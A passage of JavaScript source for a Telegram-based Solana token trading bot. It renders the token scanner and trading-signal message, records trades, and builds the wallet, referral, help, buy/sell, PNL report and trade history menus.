        const tokenBalanceInfo = await getTokenBalance(activeWallet.publicKey, address);
        userTokenBalance = tokenBalanceInfo.amount || 0;
        tokenValueUsd = userTokenBalance * price;
        
        if (userTokenBalance > 0) {
          const pnlEmoji = priceChange24h >= 0 ? '🟢' : '🔴';
          const pnlSign = priceChange24h >= 0 ? '+' : '';
          const pnlValue = tokenValueUsd * (priceChange24h / 100);
          
          pnlSection = `
━━━━━━━━━━━━━━━━━━
💼 *YOUR POSITION*
🪙 Balance: *${userTokenBalance.toFixed(4)}* ${pair.baseToken?.symbol || 'tokens'}
💵 Value: *$${tokenValueUsd.toFixed(2)}*
📊 24h PNL: ${pnlEmoji} *${pnlSign}${pnlValue.toFixed(2)}* (${pnlSign}${priceChange24h.toFixed(2)}%)
💰 SOL Balance: *${userSolBalance.toFixed(4)} SOL*`;
        }
      } catch (balanceError) {
        console.error('Balance fetch error:', balanceError);
      }
    }
    
    const rating = getSecurityRating(score);
    const scoreBar = generateScoreBar(score);
    const trend = getMarketTrend(priceChange24h);
    const signals = calculateTradingSignals(pair, score);
    
    const pairAge = Date.now() - (pair.pairCreatedAt || Date.now());
    const ageInDays = Math.floor(pairAge / (1000 * 60 * 60 * 24));
    const ageInHours = Math.floor(pairAge / (1000 * 60 * 60));
    const ageDisplay = ageInDays > 0 ? `${ageInDays} days` : `${ageInHours} hours`;
    
    const dexScreenerLink = `https://dexscreener.com/solana/${address}`;
    const solscanLink = `https://solscan.io/token/${address}`;
    const poolLink = pair.pairAddress ? `https://dexscreener.com/solana/${pair.pairAddress}` : dexScreenerLink;
    
    // 🔥 FIXED: Use readable price formatting
    const priceDisplay = formatTokenPrice(price);
    
    // 🔥 FIXED: Format TP and SL prices properly
    const tpPrice = signals.takeProfit?.price || 0;
    const slPrice = signals.stopLoss?.price || 0;
    const tpPriceDisplay = formatTokenPrice(tpPrice);
    const slPriceDisplay = formatTokenPrice(slPrice);
    
    const solPriceDisplay = solPrice > 0 ? `$${solPrice.toFixed(2)}` : '⚠️ Error';
    
    const message = `*🎯 WTF TOKEN SCANNER*

🪙 *${pair.baseToken?.name || 'Unknown'}* (${pair.baseToken?.symbol || '???'})
\`${address}\`
━━━━━━━━━━━━━━━━━━
💰 *PRICE DATA*
📊 Exchange: *${pair.dexId || 'Unknown'}*
💵 Price: *$${priceDisplay}*
🟢 1h: ${priceChange1h >= 0 ? '+' : ''}${priceChange1h.toFixed(2)}% | 6h: ${priceChange6h >= 0 ? '+' : ''}${priceChange6h.toFixed(2)}%
${priceChange24h >= 0 ? '🟢' : '🔴'} 24h: *${priceChange24h >= 0 ? '+' : ''}${priceChange24h.toFixed(2)}%* ${trend}
📈 MCap: *$${formatNumber(mcap)}*
💧 Liq: *$${formatNumber(liquidity)}*
📊 Volume: *$${formatNumber(volume)}*
━━━━━━━━━━━━━━━━━━
🛡️ *SECURITY*
Score: ${scoreBar} ${score}/100
Rating: ${rating.emoji} *${rating.text}*
${warnings.length > 0 ? '\n' + warnings.join('\n') : ''}${positives.length > 0 ? '\n' + positives.join('\n') : ''}
━━━━━━━━━━━━━━━━━━
🎯 *TRADING SIGNALS*
${signals.entry?.emoji || '⏳'} Entry: *${signals.entry?.text || 'WAIT'}*
_${signals.entry?.reason || 'Analyzing...'}_
${signals.takeProfit?.percent > 0 ? `
🎯 Take Profit: *+${signals.takeProfit.percent}%* → $${tpPriceDisplay}
🛑 Stop Loss: *-${signals.stopLoss.percent}%* → $${slPriceDisplay}` : ''}
━━━━━━━━━━━━━━━━━━
💱 *TRADE ESTIMATE*
1 SOL = *${formatNumber(tokensFor1Sol)}* ${pair.baseToken?.symbol || 'tokens'} ⚖️ SOL Price: *${solPriceDisplay}*${COMMISSION_PERCENTAGE > 0 ? `\n💸 Fee: ${COMMISSION_PERCENTAGE}% applies` : ''}${pnlSection}
━━━━━━━━━━━━━━━━━━
🦅 [DexScreener](${dexScreenerLink}) • 🔗 [Solscan](${solscanLink}) • 📈 [Pool](${poolLink})

📊 _${rating.advice || 'Analyze carefully'}. Pool age: ${ageDisplay}_`;
    
    const keyboard = Markup.inlineKeyboard([
      [
        Markup.button.callback('🔄 Refresh', `refresh_${address}`),
        Markup.button.callback('📍 Track', `track_${address}`)
      ],
      [
        Markup.button.callback('~ ~ ~ 🅱️🆄🆈 ~ ~ ~', 'noop')
      ],
      [
        Markup.button.callback('🚀 Buy 0.1 SOL', `buy_0.1_${address}`),
        Markup.button.callback('🚀 Buy 0.2 SOL', `buy_0.2_${address}`)
      ],
      [
        Markup.button.callback('🚀 Buy 0.5 SOL', `buy_0.5_${address}`)
      ],
      [
        Markup.button.callback('~ ~ ~ 🆂🅴🅻🅻 ~ ~ ~', 'noop')
      ],
      [
        Markup.button.callback('💸 Sell 25%', `sell_25_${address}`),
        Markup.button.callback('💸 Sell 50%', `sell_50_${address}`)
      ],
      [
        Markup.button.callback('💸 Sell 100%', `sell_100_${address}`),
        Markup.button.callback('💸 Custom %', `sell_custom_${address}`)
      ],
      [
        Markup.button.callback('💸 Custom Amt', `sell_custom_input_${address}`),
        Markup.button.callback('🔔 Price Alert', `price_alert_${address}`)
      ],
      [
        Markup.button.callback('🎯 Limit Order', `limit_order_${address}`),
        Markup.button.callback('📈 DCA', `dca_${address}`)
      ],
      [
        Markup.button.callback('⬅️ Back to Main', 'back_main')
      ]
    ]);
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      message,
      { parse_mode: 'Markdown', ...keyboard, disable_web_page_preview: true }
    );
    
  } catch (error) {
    console.error('Token analysis error:', error);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      `❌ Error analyzing token: ${error.message || 'Unknown error'}`
    );
  }
}

// ============================================
// RECORD TRADE FUNCTION - ADD HERE
// ============================================
function recordTrade(userId, tradeData) {
  const session = getSession(userId);
  
  const tradeRecord = {
    id: Date.now().toString(36) + Math.random().toString(36).substr(2),
    timestamp: new Date().toISOString(),
    date: new Date().toDateString(),
    time: new Date().toLocaleTimeString(),
    type: tradeData.type, // 'BUY' or 'SELL'
    tokenAddress: tradeData.tokenAddress,
    tokenSymbol: tradeData.tokenSymbol || 'Unknown',
    tokenName: tradeData.tokenName || 'Unknown',
    amountSol: tradeData.amountSol || 0,
    amountToken: tradeData.amountToken || 0,
    priceUsd: tradeData.priceUsd || 0,
    txHash: tradeData.txHash,
    valueUsd: tradeData.valueUsd || 0,
    pnlUsd: tradeData.pnlUsd || 0,
    pnlPercent: tradeData.pnlPercent || 0,
    commission: tradeData.commission || 0
  };
  
  // Add to BEGINNING of array (most recent first)
  session.tradeHistory.unshift(tradeRecord);
  
  // Keep only last 100 trades
  if (session.tradeHistory.length > 100) {
    session.tradeHistory = session.tradeHistory.slice(0, 100);
  }
  
  // Update daily stats
  const today = new Date().toDateString();
  if (!session.dailyStats || session.dailyStats.date !== today) {
    session.dailyStats = {
      date: today,
      totalTrades: 0,
      profitableTrades: 0,
      lossTrades: 0,
      totalPnl: 0
    };
  }
  
  session.dailyStats.totalTrades++;
  
  if (tradeRecord.pnlUsd > 0) {
    session.dailyStats.profitableTrades++;
    session.dailyStats.totalPnl += tradeRecord.pnlUsd;
  } else if (tradeRecord.pnlUsd < 0) {
    session.dailyStats.lossTrades++;
    session.dailyStats.totalPnl += tradeRecord.pnlUsd;
  }
  
  console.log(`✅ Trade recorded: ${tradeRecord.type} ${tradeRecord.tokenSymbol} for user ${userId}`);
  return tradeRecord;
}


// ============================================
// FIXED MAIN MENU - NEVER SHOWS ERROR
// ============================================
async function showMainMenu(ctx, edit = false) {
  try {
    const session = getSession(ctx.from.id);
    const activeWallet = getActiveWallet(session);
    
    let balance = null;
    let solPrice = 0;
    let usdValue = 0;
    let errorMsg = '';
    
    // Only fetch if wallet exists
    if (activeWallet && activeWallet.publicKey) {
      try {
        // Fetch with individual error handling
        let balanceResult, priceResult;
        
        try {
          balanceResult = await getBalanceWithFallback(activeWallet.publicKey);
        } catch (e) {
          console.error('Balance fetch failed:', e.message);
          // Try cache
          const cached = balanceCache.get(activeWallet.publicKey.toString());
          balanceResult = cached?.balance ?? null;
          if (cached) errorMsg = '(cached)';
        }
        
        try {
          priceResult = await getSolPriceWithCache();
        } catch (e) {
          console.error('Price fetch failed:', e.message);
          priceResult = solPriceCache.price || 0;
        }
        
        balance = balanceResult;
        solPrice = priceResult;
        usdValue = (balance !== null ? balance : 0) * solPrice;
        
      } catch (e) {
        console.error('Combined fetch error:', e.message);
      }
    }
    
    // Today's PNL
    const todayPnl = session.dailyStats?.totalPnl || 0;
    const pnlEmoji = todayPnl >= 0 ? '🟢' : '🔴';
    const pnlSign = todayPnl >= 0 ? '+' : '';
    
    // Build wallet info - NEVER show "Error loading" if we have cache
    let walletInfo;
    if (!activeWallet) {
      walletInfo = '⚠️ *No wallet connected*\nTap 💼 Wallet to create or import';
    } else {
      const shortAddress = shortenAddress(activeWallet.publicKey);
      
      if (balance === null && !errorMsg) {
        // Complete failure - no cache, no data
        walletInfo = `💼 *Wallet ${session.activeWalletIndex + 1}/${session.wallets.length}:* \`${shortAddress}\`\n⏳ *Balance: Loading...*`;
      } else if (balance === null && errorMsg) {
        // Have cache
        walletInfo = `💼 *Wallet ${session.activeWalletIndex + 1}/${session.wallets.length}:* \`${shortAddress}\`\n💰 *Balance: Check failed ${errorMsg}*`;
      } else if (balance === 0) {
        walletInfo = `💼 *Wallet ${session.activeWalletIndex + 1}/${session.wallets.length}:* \`${shortAddress}\`\n💰 *Balance:* 0.0000 SOL`;
      } else {
        // Success
        const usdDisplay = solPrice > 0 ? `($${usdValue.toFixed(2)})` : '';
        walletInfo = `💼 *Wallet ${session.activeWalletIndex + 1}/${session.wallets.length}:* \`${shortAddress}\`\n💰 *Balance:* ${balance.toFixed(4)} SOL ${usdDisplay} ${errorMsg}`;
      }
    }
    
    const message = `
🚀 *Welcome to Grokini Trading Bot* 🤖

*I'm your Web3 execution engine*.
AI-driven. Battle-tested. Locked down.
━━━━━━━━━━━━━━━━━━
*What I do for you*:⬇️
📊 Scan the market to tell you what to buy, ignore, or stalk
🎯 Execute entries & exits with sniper-level timing
🧠 Detect traps, fake pumps, and incoming dumps before they hit
⚡ Operate at machine-speed — no lag, no emotion
🔒 Secured with Bitcoin-grade architecture
🚀 Track price action past your take-profit so winners keep running 🏃 
━━━━━━━━━━━━━━━━━━
${walletInfo}

🏦 *CASH & STABLE COIN BANK*
_Paste any Solana contract address to analyze_
  `;
  
    const keyboard = Markup.inlineKeyboard([
      [
        Markup.button.callback('💼 Wallet', 'menu_wallet'),
        Markup.button.callback('📊 Positions', 'menu_positions')
      ],
      [
        Markup.button.callback('🚀 Buy', 'menu_buy'),
        Markup.button.callback('💸 Sell', 'menu_sell')
      ],
      [
        Markup.button.callback('📜 Trade History', 'menu_history')
      ],
      [
        Markup.button.callback('📈 PNL Report', 'menu_pnl_report')
      ],
      [
        Markup.button.callback('👥 Copy Trade', 'menu_copytrade'),
        Markup.button.callback('📈 Limit Orders', 'menu_limit')
      ],
      [
        Markup.button.callback('⚙️ Settings', 'menu_settings'),
        Markup.button.callback('🎁 Referrals', 'menu_referrals')
      ],
      [
        Markup.button.callback('❓ Help', 'menu_help'),
        Markup.button.callback('🔄 Refresh', 'refresh_main')
      ]
    ]);
    
    try {
      if (edit && ctx.callbackQuery) {
        await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
      } else {
        await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
      }
    } catch (error) {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
    
  } catch (error) {
    console.error('Critical menu error:', error);
    await ctx.reply('🚀 *WTF Trading Bot*\n\n⚠️ Menu error - Tap 🔄 Refresh', {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Refresh', 'refresh_main')]
      ])
    });
  }
}


// ============================================
// REFERRALS MENU
// ============================================
async function showReferralsMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const referralCode = getReferralCode(ctx.from.id);
  const botUsername = (await bot.telegram.getMe()).username;
  const referralLink = `https://t.me/${botUsername}?start=ref_${referralCode}`;
  
  const totalReferrals = session.referrals.length;
  const earnings = session.referralEarnings.toFixed(4);
  
  const message = `
🎁 *Referral Program*

📊 *Your Stats:*
👥 Total Referrals: ${totalReferrals}
💰 Total Earnings: ${earnings} SOL

🔗 *Your Referral Link:*
\`${referralLink}\`

📋 *Your Referral Code:*
\`${referralCode}\`

━━━━━━━━━━━━━━━━━━
*How it works:*
1️⃣ Share your referral link with friends
2️⃣ They join using your link
3️⃣ Earn 10% of their trading fees!
━━━━━━━━━━━━━━━━━━

${totalReferrals > 0 ? `\n*Recent Referrals:*\n${session.referrals.slice(-5).map((r, i) => `${i + 1}. User ${r.userId.toString().slice(-4)}... - ${new Date(r.joinedAt).toLocaleDateString()}`).join('\n')}` : '_No referrals yet. Start sharing your link!_'}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📋 Copy Link', 'referral_copy')],
    [Markup.button.callback('📤 Share', 'referral_share')],
    [Markup.button.callback('📊 View All Referrals', 'referral_list')],
    [Markup.button.callback('🔄 Refresh', 'referral_refresh')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  try {
    if (edit) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  } catch (error) {
    console.error('showReferralsMenu error:', error.message);
    if (edit) {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  }
}

// ============================================
// HELP MENU
// ============================================
async function showHelpMenu(ctx, edit = false) {
  const message = `
❓ *Help & Commands*

━━━━━━━━━━━━━━━━━━
📋 *Available Commands:*
━━━━━━━━━━━━━━━━━━

/start - Launch the bot & main menu
/wallet - Manage your wallets
/positions - View your token positions
/buy [amount] [address] - Quick buy tokens
/sell [%] [address] - Quick sell tokens
/copytrade - Copy trade settings
/limit - Manage limit orders
/settings - Bot settings
/referral - Your referral program
/help - Show this help menu

━━━━━━━━━━━━━━━━━━
🎯 *Quick Actions:*
━━━━━━━━━━━━━━━━━━

📍 *Analyze Token:* 
Just paste any Solana contract address

💰 *Buy Tokens:*
Use the Buy menu or /buy 0.5 [address]

💸 *Sell Tokens:*
Use the Sell menu or /sell 50 [address]
━━━━━━━━━━━━━━━━━━
🔧 *Features:*
━━━━━━━━━━━━━━━━━━

💼 *Multi-Wallet:* Up to 5 wallets
📊 *Token Analysis:* Security scores & metrics
🎯 *Limit Orders:* Set buy/sell triggers
📈 *DCA:* Dollar cost averaging
👥 *Copy Trade:* Follow top traders
🔔 *Price Alerts:* Get notified on price moves
🎁 *Referrals:* Earn 10% of referred fees

━━━━━━━━━━━━━━━━━━
⚙️ *Settings:*
━━━━━━━━━━━━━━━━━━

📊 *Slippage:* Adjust trade slippage %
⚡ *Priority Fee:* Set transaction priority
🔔 *Notifications:* Toggle alerts

━━━━━━━━━━━━━━━━━━
🆘 *Support:* https://t.me/Wtfsupportteam
━━━━━━━━━━━━━━━━━━

For issues or questions, contact our support team.
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('💼 Wallet Guide', 'help_wallet'),
      Markup.button.callback('📊 Trading Guide', 'help_trading')
    ],
    [
      Markup.button.callback('🔒 Security Tips', 'help_security'),
      Markup.button.callback('❓ FAQ', 'help_faq')
    ],
    [Markup.button.callback('« Back to Main', 'back_main')]
  ]);
  
  try {
    if (edit) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  } catch (error) {
    console.error('showHelpMenu error:', error.message);
    if (edit) {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
  }
}

// ============================================
// FIXED WALLET MENU - ERROR FREE
// ============================================
async function showWalletMenu(ctx, edit = false) {
  try {
    const session = getSession(ctx.from.id);
    const activeWallet = getActiveWallet(session);
    
    let message;
    let keyboardButtons = [];
    
    if (session.wallets.length > 0) {
      // Fetch SOL price once
      let solPrice = 0;
      try {
        solPrice = await getSolPrice();
      } catch (e) {
        console.error('Wallet menu SOL price error:', e);
      }
      
      let walletList = '';
      for (let i = 0; i < session.wallets.length; i++) {
        const w = session.wallets[i];
        const isActive = i === session.activeWalletIndex;
        
        let bal = 0;
        let usdVal = 0;
        try {
          bal = await getBalance(w.publicKey);
          usdVal = bal * solPrice;
        } catch (e) {
          console.error(`Balance fetch error for wallet ${i}:`, e);
        }
        
        walletList += `${isActive ? '✅' : '⚪'} *Wallet ${i + 1}:* \`${shortenAddress(w.publicKey)}\` (${bal.toFixed(2)} SOL${solPrice > 0 ? ` ~$${usdVal.toFixed(2)}` : ''})\n`;
      }
      
      let activeBalance = 0;
      let activeUsdValue = 0;
      try {
        activeBalance = await getBalance(activeWallet.publicKey);
        activeUsdValue = activeBalance * solPrice;
      } catch (e) {
        console.error('Active wallet balance error:', e);
      }
      
      message = `
💼 *Wallet Management*


${walletList}
📍 *Active Wallet:*
\`${activeWallet.publicKey}\`

💰 *Balance:* ${activeBalance.toFixed(4)} SOL ${solPrice > 0 ? `($${activeUsdValue.toFixed(2)})` : ''}


_Tap a wallet to switch, or manage below:_
    `;
      
      const switchButtons = [];
      for (let i = 0; i < session.wallets.length; i++) {
        const isActive = i === session.activeWalletIndex;
        switchButtons.push(
          Markup.button.callback(
            `${isActive ? '✅' : '🪪'} W${i + 1}`,
            `switch_wallet_${i}`
          )
        );
      }
      keyboardButtons.push(switchButtons);

      keyboardButtons.push([
        Markup.button.callback('📥 Deposit', 'wallet_deposit'),
        Markup.button.callback('📤 Transfer', 'wallet_transfer_menu')
      ]);
      
      keyboardButtons.push([
        Markup.button.callback('📤 Export Keys', 'wallet_export'),
        Markup.button.callback('🗑️ Remove', 'wallet_remove')
      ]);
      
      if (session.wallets.length < MAX_WALLETS) {
        keyboardButtons.push([
          Markup.button.callback('🆕 Create New', 'wallet_create'),
          Markup.button.callback('📥 Import', 'wallet_import_menu')
        ]);
      }
      
      keyboardButtons.push([Markup.button.callback('🔄 Refresh', 'wallet_refresh')]);
      keyboardButtons.push([Markup.button.callback('« Back', 'back_main')]);
      
    } else {
      message = `
💼 *Wallet Management*

No wallet connected.
You can have up to ${MAX_WALLETS} wallets.

Create a new wallet or import an existing one:
    `;
      
      keyboardButtons = [
        [Markup.button.callback('🆕 Create New Wallet', 'wallet_create')],
        [Markup.button.callback('📥 Import Seed Phrase', 'wallet_import_seed')],
        [Markup.button.callback('🔑 Import Private Key', 'wallet_import_key')],
        [Markup.button.callback('« Back', 'back_main')]
      ];
    }
    
    const keyboard = Markup.inlineKeyboard(keyboardButtons);
    
    try {
      if (edit && ctx.callbackQuery) {
        await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
      } else {
        await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
      }
    } catch (error) {
      console.error('showWalletMenu display error:', error.message);
      if (edit) {
        await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
      }
    }
  } catch (error) {
    console.error('showWalletMenu error:', error);
    await ctx.reply('❌ Error loading wallet menu. Please try /wallet');
  }
}

// ============================================
// POSITIONS MENU
// ============================================
async function showPositionsMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  const activeWallet = getActiveWallet(session);
  
  if (!activeWallet) {
    const message = '❌ Please connect a wallet first.';
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
    
    if (edit) {
      await ctx.editMessageText(message, { ...keyboard });
    } else {
      await ctx.reply(message, { ...keyboard });
    }
    return;
  }
  
  const message = `
📊 *Your Positions*

💼 Wallet: \`${shortenAddress(activeWallet.publicKey)}\`

_No open positions_

Paste a token address to analyze and trade.
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🔄 Refresh', 'refresh_positions')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// BUY MENU
// ============================================
async function showBuyMenu(ctx, edit = false) {
  const feeNote = COMMISSION_PERCENTAGE > 0 ? `\n💸 Fee: ${COMMISSION_PERCENTAGE}% applies` : '';
  
  const message = `
🟢 *Quick Buy*${feeNote}

Paste a token address or use /buy [amount] [address]

*Quick amounts:*
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🚀 0.1 SOL', 'setbuy_0.1'),
      Markup.button.callback('🚀 0.2 SOL', 'setbuy_0.2')
    ],
    [
      Markup.button.callback('🚀 0.5 SOL', 'setbuy_0.5'),
      Markup.button.callback('🚀 1 SOL', 'setbuy_1')
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// SELL MENU
// ============================================
async function showSellMenu(ctx, edit = false) {
  const feeNote = COMMISSION_PERCENTAGE > 0 ? `\n💸 Fee: ${COMMISSION_PERCENTAGE}% applies` : '';
  
  const message = `
🔴 *Quick Sell*${feeNote}

Select a percentage or use /sell [%] [address]

*Quick percentages:*
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('💸 25%', 'setsell_25'),
      Markup.button.callback('💸 50%', 'setsell_50')
    ],
    [
      Markup.button.callback('💸 100%', 'setsell_100'),
      Markup.button.callback('💸 Custom', 'setsell_custom')
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// PNL REPORT MENU - ADD THIS SECTION
// ============================================
async function showPNLReport(ctx, edit = false) {
  try {
    const session = getSession(ctx.from.id);
    const history = session.tradeHistory || [];
    
    if (history.length === 0) {
      const message = `
📈 *PNL Report*

_No trades yet_

Start trading to see your PNL report!
      `;
      const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🟢 Start Trading', 'menu_buy')],
        [Markup.button.callback('« Back', 'back_main')]
      ]);
      
      if (edit && ctx.callbackQuery) {
        await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
      } else {
        await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
      }
      return;
    }
    
    // Calculate overall stats
    const totalTrades = history.length;
    const buyTrades = history.filter(t => t.type === 'BUY').length;
    const sellTrades = history.filter(t => t.type === 'SELL').length;
    
    const totalVolume = history.reduce((sum, t) => sum + (t.valueUsd || 0), 0);
    const totalPnl = history.reduce((sum, t) => sum + (t.pnlUsd || 0), 0);
    const profitableTrades = history.filter(t => t.pnlUsd > 0).length;
    const lossTrades = history.filter(t => t.pnlUsd < 0).length;
    
    const winRate = totalTrades > 0 ? ((profitableTrades / totalTrades) * 100).toFixed(1) : 0;
    
    const totalEmoji = totalPnl >= 0 ? '🟢' : '🔴';
    const totalSign = totalPnl >= 0 ? '+' : '';
    
    // Group by token
    const tokenStats = {};
    const last24Hours = new Date(Date.now() - 24 * 60 * 60 * 1000);
    
    history.forEach(trade => {
      if (!tokenStats[trade.tokenAddress]) {
        tokenStats[trade.tokenAddress] = {
          symbol: trade.tokenSymbol || 'Unknown',
          name: trade.tokenName || 'Unknown',
          buys: 0,
          sells: 0,
          totalBought: 0,
          totalSold: 0,
          totalSpent: 0,
          totalReceived: 0,
          pnl: 0
        };
      }
      
      const stats = tokenStats[trade.tokenAddress];
      
      if (trade.type === 'BUY') {
        stats.buys++;
        stats.totalBought += trade.amountToken || 0;
        stats.totalSpent += trade.valueUsd || 0;
      } else {
        stats.sells++;
        stats.totalSold += trade.amountToken || 0;
        stats.totalReceived += trade.valueUsd || 0;
        const avgBuyPrice = stats.totalBought > 0 ? stats.totalSpent / stats.totalBought : 0;
        const costBasis = (trade.amountToken || 0) * avgBuyPrice;
        stats.pnl += (trade.valueUsd || 0) - costBasis;
      }
    });
    
    // Build token breakdown
    let tokenBreakdown = '';
    const sortedTokens = Object.values(tokenStats)
      .sort((a, b) => (b.totalSpent + b.totalReceived) - (a.totalSpent + a.totalReceived))
      .slice(0, 5);
    
    sortedTokens.forEach(token => {
      const pnlEmoji = token.pnl >= 0 ? '🟢' : '🔴';
      const pnlSign = token.pnl >= 0 ? '+' : '';
      tokenBreakdown += `
${pnlEmoji} *${token.symbol}*
   🟢 ${token.buys} buys | 🔴 ${token.sells} sells
   💰 $${(token.totalSpent + token.totalReceived).toFixed(2)}
   📊 PNL: ${pnlSign}$${Math.abs(token.pnl).toFixed(2)}`;
    });
    
    // 24h stats
    const trades24h = history.filter(t => new Date(t.timestamp) >= last24Hours);
    const pnl24h = trades24h.reduce((sum, t) => sum + (t.pnlUsd || 0), 0);
    const pnl24hEmoji = pnl24h >= 0 ? '🟢' : '🔴';
    const pnl24hSign = pnl24h >= 0 ? '+' : '';
    
    const message = `
📈 *PNL REPORT*

━━━━━━━━━━━━━━━━━━
💰 *OVERALL PERFORMANCE*
${totalEmoji} *Total PNL: ${totalSign}$${Math.abs(totalPnl).toFixed(2)}*
📊 Trades: ${totalTrades} (🟢${buyTrades} buys | 🔴${sellTrades} sells)
✅ Wins: ${profitableTrades} | ❌ Losses: ${lossTrades}
🎯 Win Rate: ${winRate}%
💵 Volume: $${totalVolume.toFixed(2)}

━━━━━━━━━━━━━━━━━━
⏰ *LAST 24 HOURS*
${pnl24hEmoji} PNL: ${pnl24hSign}$${Math.abs(pnl24h).toFixed(2)}
📊 Trades: ${trades24h.length}

━━━━━━━━━━━━━━━━━━
🪙 *TOP TOKENS*${tokenBreakdown}
━━━━━━━━━━━━━━━━━━`;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('📜 Full History', 'menu_history')],
      [Markup.button.callback('📥 Export CSV', 'export_pnl_csv')],
      [Markup.button.callback('🔄 Refresh', 'menu_pnl_report')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
    
    if (edit && ctx.callbackQuery) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
    
  } catch (error) {
    console.error('PNL Report error:', error);
    await ctx.reply('❌ Error loading PNL report.');
  }
}

// ============================================
// TRADE HISTORY MENU - COMPLETE
// ============================================
async function showTradeHistory(ctx, edit = false) {
  try {
    const session = getSession(ctx.from.id);
    const history = session.tradeHistory || [];
    
    if (history.length === 0) {
      const message = `
📜 *Trade History*

_No trades yet_

Start trading to see your history here!
      `;
      const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('💸 Start Trading', 'menu_buy')],
        [Markup.button.callback('« Back', 'back_main')]
      ]);
      
      if (edit && ctx.callbackQuery) {
        await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
      } else {
        await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
      }
      return;
    }
    
    // Calculate stats
    const totalTrades = history.length;
    const totalBuys = history.filter(t => t.type === 'BUY').length;
    const totalSells = history.filter(t => t.type === 'SELL').length;
    const totalVolume = history.reduce((sum, t) => sum + (t.valueUsd || 0), 0);
    
    // Build recent trades list (last 10)
    let recentTrades = '';
    const recent = history.slice(0, 10);
    
    recent.forEach((trade, index) => {
      const emoji = trade.type === 'BUY' ? '🚀' : '💸';
      const pnlEmoji = trade.pnlUsd > 0 ? '🚀+' : trade.pnlUsd < 0 ? '🔴' : '⚪';
      const pnlText = trade.pnlUsd !== 0 ? `| ${pnlEmoji}$${Math.abs(trade.pnlUsd).toFixed(2)}` : '';
      
      recentTrades += `${index + 1}. ${emoji} *${trade.type}* ${trade.tokenSymbol || 'Unknown'}\n`;
      recentTrades += `   💰 ${trade.amountSol?.toFixed(3) || '---'} SOL → ${trade.amountToken?.toFixed(2) || '---'} tokens\n`;
      recentTrades += `   💵 $${trade.valueUsd?.toFixed(2) || '---'} ${pnlText}\n`;
      recentTrades += `   🕐 ${trade.time || '---'} 📝 \`${shortenAddress(trade.txHash)}\`\n\n`;
    });
    
    const message = `
📜 *Trade History* (${totalTrades} total)

📊 *Overview:*
🟢 Buys: ${totalBuys} | 💸 Sells: ${totalSells}
💵 Total Volume: $${totalVolume.toFixed(2)}

━━━━━━━━━━━━━━━━━━
*Recent Trades:*
${recentTrades}
    `;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('📈 View PNL Report', 'menu_pnl_report')],
      [Markup.button.callback('📥 Export CSV', 'export_history_csv')],
      [Markup.button.callback('🗑️ Clear History', 'clear_history_confirm')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
    
    if (edit && ctx.callbackQuery) {
      await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
    } else {
      await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
    }
    
  } catch (error) {
    console.error('History error:', error);
    await ctx.reply('❌ Error loading history.');
  }
}

// ============================================
// COPY TRADE MENU
// ============================================
async function showCopyTradeMenu(ctx, edit = false) {
  const session = getSession(ctx.from.id);
  
  const message = `
👥 *Copy Trade*

Follow successful traders automatically.

${session.copyTradeWallets.length > 0 
  ? '*Tracking:*\n' + session.copyTradeWallets.map(w => `• \`${shortenAddress(w)}\``).join('\n')
  : '_No wallets being tracked_'}

Send a wallet address to start copy trading.
  `;
  
  const keyboard = Markup.inlineKeyboard([
